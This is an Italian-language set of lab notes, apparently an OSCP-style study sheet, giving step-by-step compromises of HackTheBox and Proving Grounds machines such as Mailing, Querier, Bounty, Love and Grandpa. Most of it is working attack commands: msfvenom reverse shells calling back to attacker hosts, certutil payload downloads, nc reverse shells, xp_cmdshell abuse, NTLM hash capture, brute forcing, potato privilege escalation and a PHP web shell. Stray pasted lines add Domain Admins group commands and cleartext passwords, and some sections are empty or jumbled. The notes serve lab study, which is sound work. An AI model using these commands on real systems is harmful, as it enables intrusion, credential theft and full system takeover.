##### Exploitations
- [[#LFI]]
	1. [[#Mailing]]
	2. [[#DVR4]]
	3. [[#Fish]]
- [[#RFI]]
	1. [[#Slort]]
- [[#MSSQL]]
	1. [[#Querier]]
- [[#File Uploads]]
	1. [[#Bounty]]
- [[#Samba]]
	1. [[#Bastion]]
- [[#FTP]]
	1. [[#Devel]]
	2. [[#Netmon]]
	3. [[#AuthBy]]
- [[#WebDAV]]
	1. [[#Grandpa]]
- [[#Web Server]]
	1. [[#Jerry]]
- [[#Wordpress]]
	1. [[]]
- [[#SSRF]]
	1. [[#Love]]
	2. [[#Heist]]
- [[#RCE]]
	1. [[#Algeron]]
	2. [[#Jacko]]
	3. [[#Steel Mountain]]
	4. [[#Alfred]]
	5. [[#Blueprint]]
	6. [[#Cyberlens]]
	7. [[#Buff]]
	8. [[#Artic]]
	9. [[#Jeeves]]
	10. [[#BillyBoss]]
	11. [[#Mice]]
	12. [[#Monster]]
- [[#Operative System]]
	1. [[#Legacy]]
- [[#Bypass Authentication]]
	1. [[#HackPark]]
- [[#CMS]]
	1. [[#Omni]]
	2. [[#HTTP File Server]]
	3. [[#Remote]]
	4. [[#ServerMon]]
	5. [[#Bastard]]
- [[#EAR]]
	  1. [[#Previse]]
- [[#XSS]]
	1. [[#SecNotes]]
- [[#Proxy]]
	1. [[#Squid]]
- [[#Phishing]]
	1. [[#Hepet]]
- [[#SMB]]
	1. [[#Relevant]]
	2. [[#Weasel]]
	3. [[#AllSigns2pwnAge]]
- [[#SNMP]]
	1. [[#Year Of The Owl]]
- [[#SQL Injection]]
	1. [[#Giddy]]
	2. [[#MedJed]]
- [[#Telnet]]
	1. [[#Access]]
- [[#Buffer Overflow]]
	1. [[#Internal]]
- [[#XML Attack]]
	1. [[#Markup]]
- [[#Others]]
	1. [[#Chatterbox]]
	2. [[#Escape]]
	3. [[#Job]]
	4. [[#Job2]]
	5. [[#Anthem]]
##### Privileges Escalation
- **Abusing permissions**
	1. [[#Bounty]]
	2. [[#Love]]
	3. [[#Omni]]
	4. [[#Craft]]
	5. [[#Anthem]]
	6. [[#Giddy]]
	7. [[#Jeeves]]
	8. [[#BillyBoss]]
	9. [[#Hepet]]
- **Credentials Saved**
	1. [[#Access]]
- **Cronjobs**
	1. [[#Markup]]
	2. [[#Slort]]
- **Kernel Exploitation**
	1. [[#Devel]]
	2. [[#Grandpa]]
	3. [[#Grandpa]]
	4. [[#Granny]]
	5. [[#HTTP File Server]]
	6. [[#Artic]]
- **Kerberoasting**
	1. [[#Active]]
- **AlwaysinstallElevated**
	1. [[#Weasel]]
	2. [[#Cyberlens]]
- **Unquoted Service Path**
	1. [[#Steel Mountain]]
- **Credential Reused**
	1. [[#Bastion]]
- **SAM**
	1. [[#Year Of The Owl]]
	2. [[#Blueprint]]
- **AlwaysInstallElevated**
	1. [[#Love]]

## LFI

### Mailing

| üß† **Azione**           | üíª **Comando / Metodo**                                                                                                                                                                                                                                                                                                                                                                                                                                                      | üìù **Output / Scopo**                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                           |
| ----------------------- | ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| **HMailServer 4.4.2**   | 1. ![[Pasted image 20250824172556.png]]<br>2. ![[Pasted image 20250824191139.png]]                                                                                                                                                                                                                                                                                                                                                                                           | Sulla porta `80` √® presente il servizio *HMailServer* che √® vulnerabile a [LFI](https://www.exploit-db.com/exploits/7012). Troviamo un link che prende in locale un file e provando attacchi di LFI riusciamo come nella *1.*.<br>Da questo [link](https://www.hmailserver.com/forum/viewtopic.php?t=38903) otteniamo il percorso ai file di configurazione `c:\Program Files (x86)\hMailServer\Bin\hMailServer.ini` del servizio ed otteniamo le credenziali come nella *2.*                                                                                   |
| **Send Emails**         | 1. `swaks --auth-user 'administrator@mailing.htb' --auth LOGIN --auth-password bad_password --quit-after AUTH --server mailing.htb`<br>2. `responder -i tun0`<br>3. `python CVE-2024-21413.py --server mailing.htb --port 587 --username administrator@mailing.htb --password homenetworkingadministrator --sender 0xdf@mailing.htb --recipient maya@mailing.htb --url "\\10.10.14.6\share\sploit" --subject "Check this out ASAP"`<br>4. `john hash --wordlist=rockyou.txt` | Adesso che abbiamo delle credenziali notiamo che possiamo usarli per entrare nel servizio *SMTP* con la *1.*. Poich√© abbiamo l'accesso possiamo inviare una mail all'utente `maya@mailing.htb` identificato precedentemente e catturarne l'NTLM hash.<br>Utilizziamo la *2.* per rimanere in ascolto, scarichiamo da questo link [CVE-2024-21413](https://github.com/xaitax/CVE-2024-21413-Microsoft-Outlook-Remote-Code-Execution-Vulnerability) il tool per inviare la mail ed usiamo la *3.* per avviarlo. Ci restituir√† un NTLM che craccheremo con la *4.* |
| **LibreOffice 7.4.0.1** | 1. `python3 CVE-2023-2255.py --cmd 'REVERSE SHELL' --output 'exploit.odt'`<br>2. `nc -lvnp LPORT`                                                                                                                                                                                                                                                                                                                                                                            | Dopo aver effettuato l'accesso con `evil-winrm` come utente `maya`, cerchiamo in `C:\Program Files (x86)\` un software insolito come *LibreOffice 7.4.0.1* che √® vulnerabile a PrivEsc [### CVE-2023-2255](https://github.com/elweth-sec/CVE-2023-2255). <br>Utilizziamo la *1.* per creare una reverse shell in formato `.odt` e carichiamolo sulla macchina target su `C:\Important Documents` ed attendiamo con la *2.*take RDP<br>RXW permission on C:\Windows\Logs\task.bat<br>M permission on C:\Tasks\automation                                         |


- [writeup](https://olivierkonate.medium.com/hackthebox-mailing-b28d1a8f815a)

### DVR4

| üß† **Azione**                                | üíª **Comando / Metodo**                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                               | üìù **Output / Scopo**                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        |
| -------------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| **Argus Surveillance DVR4**                  | 1. ![[Pasted image 20250907171314.png]]<br><br><br><br><br>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                           | Sulla porta `8080` troviamo *Argus Surveillance DVR4.0* che √® vulnerabile a [Path Traversal](https://www.exploit-db.com/exploits/45296?source=post_page-----b97374d3733f---------------------------------------). Applicando la *1.* riusciamo a leggere il filw `windows.ini`                                                                                                                                                                                                                                                                                                                                                                                               |
| **SSH Private Key**                          | 1. ![[Pasted image 20250907172437.png]] <br> impacket-GetADUsers oscp.exam/b.martin:MartiniAllNight222 -dc-ip172.16.124.200 -all<br>file con utenti<br>nxc smb 172.16.124.200 -u utenti-dom.txt -p passTrocata<br>winrmcroger 202amministratore<br>abbiamo ingresso anche alla 200conquellodiprima<br>net rpc group addmem "Domain Admins" "c.rogers" -U "oscp.exam"/"c.rogers" -S "172.16.124.202"<br>net rpc group addmem "Domain Admins" "c.rogers" -U "oscp.exam"/"c.rogers" -S "172.16.124.200"<br>net rpc group members "Domain Admins" "c.rogers" -U "oscp.exam"/"c.rogers" -S "172.16.124.200"<br>winemcrogersqueaky200admini | Poich√© √® vulnerabile a LFI possiamo provare a cercare le chiavi private SSH degli utenti. In genere la chiave SSH si trova in `C:\Users\USER\.ssh\id_rsa`. Enumerando l'interfaccia web scopriamo che esistono gli utenti `Administrator` e `Viewer` sulla macchina quindi utilizziamo la *1.* per ottenere la chiave privata SSH di `Viewer`. Una volta ottenuta effettuiamo l'accesso                                                                                                                                                                                                                                                                                      |
| **Argus Surveillance DVR4.0 Wak Encryption** | 1. `python3 crack.py`<br>2. `certutil.exe -urlcache -f¬†http://IP_KALI/win/nc.exe`<br>3. `runas /user:administrator ‚ÄúC:\users\viewer\desktop\nc.exe -e cmd.exe IP_KALI 443‚Äù`                                                                                                                                                                                                                                                                                                                                                                                                                                                           | Il servizio *Argus Surveillance DVR4.0* √® vulnerabile a weak ecnryption Ispezionando il file `C:\ProgramData\PY_Software\Argus Surveillance DVR\DVRParams.ini` troviamo le password debolmente cifrate degli utenti. Scarichiamo il [tool](https://www.exploit-db.com/exploits/50130) per decriptare la password, cambiamo il parametro `pass_hash` ed utilizziamo la *1.* per avviarlo da cui otteniamo la password `14WatchD0g`.<br>Carichiamo `nc` sulla macchina target con la *2.* ed avviamo una reverse shell con la *3.*<br><br>**NB:** la password corretta √® `14WatchD0g$` ma poich√© l'ultimo carattere non veniva decifrato abbiamo dovuto fare diversi tentativi |

- [writeup](https://infosecwriteups.com/proving-grounds-practice-dvr4-walkthrough-b97374d3733f)

### Fish

| üß† **Azione**         | üíª **Comando / Metodo**                                                                                                           | üìù **Output / Scopo**                                                                                                                                                                                                                                                                  |
| --------------------- | --------------------------------------------------------------------------------------------------------------------------------- | -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| **GlassFish 4.1**     | 1. ![[Pasted image 20250908214304.png]]                                                                                           | Sulla porta `4848` √® presente il servizio *GlassFish 4.1* che √® vulnerabile a [LFI](https://www.exploit-db.com/exploits/39441).  Leggiamo i file di *SynaMan* ovvero l'altro servizio presente sulla macchina target come nella *1.* e troviamo le credenziali `arthur:KingOfAtlantis` |
| **GlassFish Privesc** | 1. `msfvenom -p java/jsp_shell_reverse_tcp LHOST=IP_KALI LPORT=443 -f war > shell.war`<br>2. ![[Pasted image 20250908214705.png]] | Poich√© *GlassFish* permette l'esecuzione di file `.war` allora creiamo una reverse shell di quel formato con la *1.* e carichiamolo sulla macchina target.<br>Lanciamo come nella *2.* ed attendiamo che si connetta alla nostra porta in ascolto                                      |


- [writeup](https://medium.com/@Fasil713/fish-pg-walkthrough-e844a4f5c4bf)
## RFI

### Slort

| üß† **Azione** | üíª **Comando / Metodo**                                                                                                                                               | üìù **Output / Scopo**                                                                                                                                                                                                                                                           |
| ------------- | --------------------------------------------------------------------------------------------------------------------------------------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| **RFI**       | 1. ![[Pasted image 20250906150548.png]]<br>2. ![[Pasted image 20250906150837.png]]                                                                                    | Sulla porta `4443` scopriamo che il parametro `?page` √® vulnerabile a LFI come nella *1.*. Se proviamo a far leggere un file `.php` sulla nostra macchina come nella *2.*, scopriamo che √® vulnerabile anche a RFI. Utilizziamo una reverse shell in PHP per ottenere l'accesso |
| **TFTP.EXE**  | 1. `msfvenom -p windows/shell_reverse_tcp LHOST=IP_KALI LPORT=1234 -f exe > TFTP.EXE`<br>2. `certutil -urlcache -f http://192.168.45.153/TFTP.EXE C:\Backup\TFTP.EXE` | Scopriamo che il file `C:\Backup\backup.txt` esegue ogni 5min lo script `TFTP.EXE` come utente amministratore. <br>Creiamo una reverse shell con la *1.*, con la *2.* carichiamola sulla macchina target al posto del file di prima ed infine aspettiamo che si colleghi        |

- [writeup](https://banua.medium.com/proving-grounds-slort-oscp-prep-2025-practice-16-856200d17db6)

## MSSQL

### Querier

| üß† **Azione**             | üíª **Comando / Metodo**                                                                                                                                                                                                                                                               | üìù **Output / Scopo**                                                                                                                                                                                                                                                                                                                                                                                                                                                                  |
| ------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| **xlsm File**             | 1. `unzip FILE.xlsm`<br>2. `strings FILE.bin`                                                                                                                                                                                                                                         | Accediamo al servizio *SMB* come utente anonimo e troviamo un file di formato `.xlsm`. Unzippando il file con la *1.* troviamo il file `.bin` contenente delle credenziali in chiaro `reporting:PASS` con la *2.*                                                                                                                                                                                                                                                                      |
| **MSSQL**                 | 1. *KALI* `mssqlclient.py reporting:PASS@IP_TARGET -windows-auth`<br>2. *MSSQL* `SELECT IS_SRVROLEMEMBER('sysadmin');`<br>3. *KALI* `responder -I tun0`<br>4. *MSSQL* `exec xp_dirtree '//IP_KALI/404/',1,0;`<br>5. *KALI* `john hash --wordlist=rockyou.txt`                         | Dalla scansione di `nmap` notiamo che il servizio *MSSQL* √® aperto dunque utilizziamo la *1.* per entrare con le credenziali trovate precedentemente. Con la *2.* ci restituisce come risultato `0` dunque sappiamo di non essere amministratori del servizio. Proviamo a catturare l'NTLM nel seguente modo: usiamo la *3.* sulla nostra macchina per metterla in ascolto e la *4.* per inviare una richiesta e catturare l'NTLM. Infine la *5.* per craccare l'hash appena catturato |
| **Attivare xp_dirtree**   | 1. *KALI* `mssqlclient.py mssql-svc:PASS@IP_TARGET -windows-auth`<br>2. *MSSQL* `EXEC xp_cmdshell 'whoami'`<br>3. *MSSQL* `EXEC sp_configure 'show advanced options', 1;`<br>4. *MSSQL* `RECONFIGURE`<br>5. *MSSQL* `EXEC sp_configure 'xp_cmdshell',1;`<br>6. *MSSQL* `RECONFIGURE;` | Colleghiamoci con le nuove credenziali con la *1.* al servizio. Applicando la *2.* notiamo che ci restituisce un errore, questo √® causato dal fatto che `xp_cmdshell` √® disabilitato; attiviamolo utilizzando la *3.*,*4.*,*5.* e *6.*                                                                                                                                                                                                                                                 |
| **Reverse shell**         | 1. *KALI* `impacket-smbserver hack $(pwd) -smb2support`<br>2. *MSSQL* `xp_cmdshell \\IP_KALI\hack\nc.exe -e cmd.exe IP_KALI LPORT`                                                                                                                                                    | Adesso che siamo amministratori del servizio possiamo avviare una reverse shell. Sulla nostra macchina applichiamo la *1.* per mettere in ascolto, in seguito utilizziamo la *2.* scaricare sulla macchina target `nc.exe` ed avviare la reverse shell                                                                                                                                                                                                                                 |
| **ClearText Credentials** | 1. `poweshell.exe`<br>2. `net use \\IP_KALI\hack`<br>3. `copy \\IP_KALI\hack\PowerUp.ps1 C:\Users\user\Desktop\PowerUp.ps1`<br>4. `. ./PowerUp.ps1`<br>5. `Invoke-AllChecks`                                                                                                          | Avviamo `powershell.exe` con la *1.*, scarichiamo con la *2.* e *3.* `PowerUp.ps1` ed avviamolo con la *4.* e *5.*. Troviamo le credenziali in chiaro dell'utente amministratore                                                                                                                                                                                                                                                                                                       |


- [writeup](https://0xdf.gitlab.io/2019/06/22/htb-querier.html#privesc-mssql-svc--administrator)

## File Uploads
### Bounty

| üß† **Azione**                                 | üíª **Comando / Metodo**                                                                                                                                                                                      | üìù **Output / Scopo**                                                                                                                                                                                                                             |
| --------------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| **Enumerazione directory**                    | utilizzo `dirbuster`                                                                                                                                                                                         | Trovo `/transfer.aspx` e `/uploadedFiles`                                                                                                                                                                                                         |
| **Upload file su Windows**                    | Cambio l'estensione del file con Intruder (`php, php7, config, cgi, exe, aspx, asp, pl`) per vedere quale file accetta                                                                                       | Accetta file `config`                                                                                                                                                                                                                             |
| **Detecting backdoor**                        | googlando `'rce asp config upload file'` trovo la rce in questo [link](https://soroush.me/blog/2014/07/upload-a-web-config-file-for-fun-profit/) modificandolo per ottenere una [[RCE web.config#Detecting]] | Carico il file `web.config` navigo su `/uploadedFiles/web.config` e vedo scritto '3' quindi ha funzionato                                                                                                                                         |
| **Creazione reverse shell**                   | Creo una reverse shell con `'msfvenom -p windows/shell_reverse_tcp LHOST=10.10.16.13 LPORT=4444 -f exe > rev_shell.exe'`                                                                                     |                                                                                                                                                                                                                                                   |
| **Upload reverse shell**                      | modifico il file config nel seguente modo [[RCE web.config#Reverse shell]] e metto in ascolto con `python3 -m http.server 8080` e `nc -lvpn 4444`                                                            | Scarica la shell sulla macchina vittima e la avvia, quindi mi collego                                                                                                                                                                             |
| **Privilege escalation**                      | `whoami /all`                                                                                                                                                                                                | L'utente attuale ha il flag `SeImpersonatePrivilege` abilitato, ci√≤ significa che vulnerabile secondo [hacktricks](https://book.hacktricks.wiki/es/windows-hardening/windows-local-privilege-escalation/privilege-escalation-abusing-tokens.html) |
| **Scarico JuicyPotato sulla macchina target** | 1. `certutil -urlcache -split -f http://IP_KALI:80/JuicyPotato.exe`                                                                                                                                          | su kali scarico [JuicyPotato.exe](https://github.com/ohpe/juicy-potato/releases/download/v0.1/JuicyPotato.exe) poi la carico sulla macchina vittima con la *1.*                                                                                   |
| **Nuova porta in ascolto**                    | 1. `msfvenom -p windows/shell_reverse_tcp LHOST=IP_KALI LPORT=5555 -f exe > reverse.exe` <br>                                                                                                                | Creo con la *1.* una nuova reverse shell con una nuova porta in ascolto                                                                                                                                                                           |
| **Carico sul target**                         | 1. `certutil -urlcache -split -f http://10.21.210.203:80/reverse.exe`<br>2. `nc -lvnp 5555`                                                                                                                  | La carico sul target con la *1.* e metto in ascolto con la *2.*                                                                                                                                                                                   |
| **Administrator**                             | 1. `JuicyPotato.exe -l 5555 -t * -p reverse.exe`<br>                                                                                                                                                         | divento Administrator                                                                                                                                                                                                                             |

- [writeup](https://cyberkareem.medium.com/hackthebox-bounty-walkthrough-f7bf8fb45cc6)
### Craft

| üß† **Azione**            | üíª **Comando / Metodo**                                                                                                                                                 | üìù **Output / Scopo**                                                                                                                                                                                                                                                                                                                                                           |
| ------------------------ | ----------------------------------------------------------------------------------------------------------------------------------------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| **File Upload ODT file** | 1. ![[Pasted image 20250714192643.png]]                                                                                                                                 | Sulla pagina principale trovo un servizio per caricare solo file di estensione `.odt`. Possiamo caricare una reverse shell in formato `.odt` utilizzando questa [guida](https://medium.com/@akshay__0/initial-access-via-malicious-odt-macro-ac7f5d15796d). Inseriamo una reverse shell come nell'immagine *1.*                                                                 |
| **Xampp**                | 1. *KALI* `<?php system($_GET["cmd"]); ?>`<br>2. *TARGET*`certutil -urlcache -split -f http://IP_KALI/cmd.php`                                                          | Una volta ottenuto l'initial foothold notiamo che possiamo scrivere sulla webroot `C:\xampp\htdocs`. Creiamo un file `.php` con la contenete la *1.* e carichiamolo con la *2.* sulla macchina target. Adesso possiamo navigarlo dall'esterno ed avviare una reverse shell e diventare utetnte `apache`<br><br>NB: questo passaggio √® stato necessario per del lateral movement |
| **Privileges**           | 1. `reg query "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\NET Framework Setup\NDP"`<br>2. `.\GodPotato-NET4.exe -cmd ".\nc64.exe IP_KALI 80 -e c:\windows\system32\cmd.exe"` | L'utente `apache` ha i permessi `SetImpersonatePrivilege`. Scopriamo con la *1.* se √® presente .NET. Poich√© √® presente .NET possiamo caricare [GodPotato-NET4.exe](https://github.com/BeichenDream/GodPotato/releases/download/V1.20/GodPotato-NET4.exe) sulla macchina target ed avviarlo con la *2.*                                                                          |

- [writeup](https://medium.com/@Dpsypher/proving-grounds-practice-craft-4a62baf140cc)

## Samba
### Bastion

| üß† Azione                                | üíª Comando / Metodo                                                                          | üìù Output / Scopo                       |
| ---------------------------------------- | -------------------------------------------------------------------------------------------- | --------------------------------------- |
| ***Enumerazione SMB***                   | `smbclient //10.10.10.134/Backups -N` `enum4linux`                                           | Trovo backup `WindowsImageBackup`       |
| **Scarico file VHD**                     | `mount -t cifs //10.10.10.134/Backups /mnt/htb -o guest` `cp <.vhd> ~/`                      | Scarico immagine disco di backup        |
| **Montaggio VHD**                        | `modprobe nbd max_part=8``qemu-nbd --connect=/dev/nbd0 file.vhd``mount /dev/nbd0p2 /mnt/vhd` | Accedo al file system del disco         |
| **Raccolta credenziali**                 | `cat /mnt/vhd/Users/L4mpje/Documents/notes.txt`                                              | Trovo password o file di configurazione |
| **Accesso SSH come `L4mpje`**            | `ssh L4mpje@10.10.10.134`                                                                    | Ottengo shell utente                    |
| **Analisi `mRemoteNG`**                  | `cat C:\Users\L4mpje\AppData\Roaming\confCons.xml`<br>`python3 decrypt.py confCons.xml`      | Decripto password admin da backup       |
| **Decriptazione password Administrator** | `python3 mremoteng_decrypt.py -s <password_cifrata>`                                         | Ottengo password: `thXLHM96BeKL0ER2`    |
| **Accesso SSH come Administrator**       | `ssh Administrator@10.10.10.134`                                                             | Ottengo accesso SYSTEM                  |

- [writeup](https://systemweakness.com/htb-bastion-machine-walkthrough-explanation-01696eaa2f91)
## FTP

### Devel

| üß† Azione                 | üíª Comando Chiave                                                                                    | üìù Output / Scopo                                                                                                                   |
| ------------------------- | ---------------------------------------------------------------------------------------------------- | ----------------------------------------------------------------------------------------------------------------------------------- |
| **Reverse shell windows** | `msfvenom -p windows/meterpreter/reverse_tcp LHOST=IP_KALI LPORT=4444 -f aspx -o reverse_shell.aspx` | Creo una reverse shell per windows                                                                                                  |
| **Inserire su FTP**       | `put reverse_shell.aspx`                                                                             | FTP permette l'inserimento dei file quindi carico la reverse shell e poi la navigo                                                  |
| **Privilege escalation**  | `systeminfo`                                                                                         | La versione del SO √® `6.1.7600 N/A Build 7600`. Secondo [exploit database](https://www.exploit-db.com/exploits/40564) √® vulnerabile |
| **Vulnerabilit√†**         | `i686-w64-mingw32-gcc 40564.c -o exploit.exe -lws2_32`                                               | Scarico il file e poi lo compilo. Infine lo carico tramite FTP                                                                      |
| **Root**                  | `where /r C:\ exploit.exe`<br>`exploit.exe`                                                          | Divento root                                                                                                                        |

- [writeup](https://medium.com/@onurinalkac/hack-the-box-grandpa-writeup-2a572da0e8be)


### Netmon

| **üß† Azione**                | **üíª Comando Chiave**                                                                             | **üìù Output / Scopo**                                                                                                                                                                                                                                                                                                                                                 |
| ---------------------------- | ------------------------------------------------------------------------------------------------- | --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| **FTP**                      |                                                                                                   | Entrando con le credenziali standard abbiamo accesso a tutto il SO. Apriamo il file `C:\Program Files (x86)\PRTG Network Monitor\Configuration.bat` e troviamo una password `PrTg@dmin2018`                                                                                                                                                                           |
| **PRTG Network Monitor RCE** | 1. `./exploit.py -i IP_TARGET -p RPORT --lhost IP_KALI --lport LPORT --user USER --password PASS` | Sulla porta principale inseriamo le credenziali `prtgadmin:PrTg@dmin2018` ed entriamo nel servizio. Questa versione √® vulnerabile a RCE [CVE-2018-9276](https://github.com/A1vinSmith/CVE-2018-9276/tree/main?source=post_page-----9b6649f1c449---------------------------------------). Utilizziamo la *1.* per avviare una reverse shell e diventare amministratori |

- [writeup](https://anans1.medium.com/htb-netmon-write-up-9b6649f1c449)

### AuthBy

| **üß† Azione**                    | **üíª Comando Chiave**                                                                                                                 | **üìù Output / Scopo**                                                                                                                                                                                                                                                                                                                           |
| -------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------- | ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| **FTP Bruteforce**               | 1. `hydra -L rockyou.txt -P rockyou.txt ftp://IP_TARGET -f -t 26`<br>2. `john hash --wordlist=rockyou.txt`                            | Applicando un bruteforce con la *1.* riusciamo ad accedere con le credenziali `admin:admin` dove scarichiamo il file `.htpasswd`. Il file contiene delle credenziali hashate che cracchiamo con la *2.*                                                                                                                                         |
| **FTP Upload File**              | 1. `put rev.php`                                                                                                                      | Con le credenziali trovate precedentemente possiamo accedere alla porta `242`. Carichiamo sul servizio *FTP* con la *1.* una reverse shell; infine navighiamo la pagina `/rev.php` per avviarla                                                                                                                                                 |
| **Windows Server 2008 Standard** | 1. `systeminfo`<br>2. `searchsploit -m 40564.c`<br>3. `i686-w64-mingw32-gcc -o 40564.exe 40564.c -lws2_32`<br>4. *TARGET* `40564.exe` | Con la *1.* controlliamo le info del sistema e scopriamo che √® installato *Windows Server 2008 Standard* che sappiamo essere vulnerabile a [MS11-046](https://www.exploit-db.com/exploits/40564). <br>Utilizziamo la *2.* per predere l'exploit e la *3.* per creare il formato `.exe`. Carichiamolo sulla macchina e poi avviamolo con la *4.* |
 

- [writeup](https://medium.com/@mahdi_78420/authby-walkthrough-practice-tjnull-0c1ba0e415b8)

## WebDAV

### Grandpa

| üß† **Azione**                       | üíª **Comando / Metodo**                                                                                                    | üìù **Output / Scopo**                                                                                                                                             |
| ----------------------------------- | -------------------------------------------------------------------------------------------------------------------------- | ----------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| **Enumerazione metodi HTTP**        | `davtest --url http://10.10.10.14`                                                                                         | Notiamo che utilizza WebDAV perci√≤ vediamo che metodi accetta                                                                                                     |
| **Verifica vulnerabilit√† WebDAV**   | `searchsploit webdav`                                                                                                      | IIS 6.0 con WebDAV abilitato √® vulnerabile a un overflow di buffer remoto (CVE-2017-7269).                                                                        |
| **Accesso iniziale con Metasploit** | `use exploit/windows/iis/iis_webdav_scstoragepathfromurl`                                                                  | Ottenuta una sessione Meterpreter come `NT AUTHORITY\NETWORK SERVICE`.                                                                                            |
| **Enumerazione exploit locali**     | 1. `background`  <br>2. `use post/multi/recon/local_exploit_suggester`  <br>3. `set SESSION <ID>`  <br>4. `run`            | Identificati exploit locali disponibili, tra cui `ms10_015_kitrap0d`.                                                                                             |
| **Scelgo utente con permessi alti** | 1. `sessions 1`<br>2. `ps`<br>3. `migrate 2274`<br>4. `bg`                                                                 | Torno al meterpreter e vedo quali servizi girano con `ps`. Migro al servizio con privilegi `NT AUTHORITY\NETWORK SERVICE` per avviare il mio privilege escalation |
| **Escalation dei privilegi**        | 1. `use exploit/windows/local/ms10_015_kitrap0d`  <br>2. `set SESSION <ID>`  <br>3. `set LHOST <tuo IP>`  <br>4. `exploit` | Elevazione dei privilegi a `NT AUTHORITY\SYSTEM`.                                                                                                                 |
- [writeup](https://medium.com/@onurinalkac/hack-the-box-grandpa-writeup-2a572da0e8be)

## Web Server

### Jerry

| üß† **Azione**  | üíª **Comando / Metodo**                                                                                                              | üìù **Output / Scopo**                                                                                                                                                                                                                          |
| -------------- | ------------------------------------------------------------------------------------------------------------------------------------ | ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| **Bruteforce** | 1. `use auxiliary/scanner/http/tomcat_mgr_login`<br>2. `set rhosts IP_TARGET`<br>3. `set rport 8080`<br>4. `exploit`<br>             | Googlo `Apache Tomcat/7.0.88` e trovo un [link](https://github.com/psmiraglia/ctf/blob/master/kevgir/001-tomcat.md) che mi consiglia un bruteforce con le credenziali di default di Tomcat.<br><br>Le credenziali trovate sono `tomcat:s3cret` |
| **Foothold**   | 1. `set httpusername tomcat`<br>2. `set httppassword s3cret`<br>3. `set rhosts IP_ATTACCANTE`<br>4. `set rport 8080`<br>5. `exploit` | Nello stesso [link](https://github.com/psmiraglia/ctf/blob/master/kevgir/001-tomcat.md) trovo come uploadare un file con una RCE                                                                                                               |
| **Root**       |                                                                                                                                      | Nella cartella `C:\Users\Administrator` trovo i flags                                                                                                                                                                                          |
- [writeup](https://medium.com/@bl34chchig0/jerry-hackthebox-write-up-275c9f6144d7)

## Wordpress

### 

| üß† **Azione** | üíª **Comando / Metodo** | üìù **Output / Scopo** |
| ------------- | ----------------------- | --------------------- |
|               |                         |                       |



## SSRF

### Love

| üß† **Azione**     | üíª **Comando / Metodo**                                                                                                                                                                                                                                                                                                | üìù **Output / Scopo**                                                                                                                                                                                                                                                                                                                                                      |
| ----------------- | ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| **SSRF**          |                                                                                                                                                                                                                                                                                                                        | Navigo in `https://staging.love.htb/bin.php` dove trovo vulnerabile a SSRF: inserisco il comando `http://localhost:5000` per connettermi ad una porta inaccessibile dall'esterno. Trovo le credenziali amministratore                                                                                                                                                      |
| **Upload RCE**    |                                                                                                                                                                                                                                                                                                                        | Una volta autenticato su `Voting System`, seguo queste [istruzioni](https://www.exploit-db.com/exploits/49445) per inserire una RCE e connettermi da remoto. Devo cambiare il path del codice in `C:\xampp\htdocs\omrs\images\sell.php` per eseguire la shell                                                                                                              |
| **PowerShell**    | `C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe`                                                                                                                                                                                                                                                            | Avvio una la Powershell sulla macchina target                                                                                                                                                                                                                                                                                                                              |
| **Administrator** | 1. *KALI: *`msfvenom -p windows/x64/shell_reverse_tcp LHOST=<attacker_ip> lport=1234 -a x64 ‚Äìplatform windows -f msi -o shell.msi`<br>2. *TARGET:* `certutil -urlcache -split -f http://IP_ATTACCANTE:8080/shell.msi`<br>3. *KALI:* `nc -lvpn 1234`<br>4. *TARGET:* `wget http://<attacker_ip>/shell.msi -o shell.msi` | Eseguo `winpeas.exe` sulla macchina vittima per trovare vulnerabilit√†. La macchina √® vulnerabile a `AlwaysInstallElevated`. Utilizzo questo [manuale](https://blog.cyberplural.com/leveraging-alwaysinstallelevated-for-windows-privilege-escalation/) per sfruttare la vulnerabilit√†: il sistema permette a qualsiasi utente di eseguire i file `.msi` come Administrator |

- [writeup](https://0xdf.gitlab.io/2021/08/07/htb-love.html)

### Heist

| üß† **Azione** | üíª **Comando / Metodo** | üìù **Output / Scopo** |
| ------------- | ----------------------- | --------------------- |
|               |                         |                       |




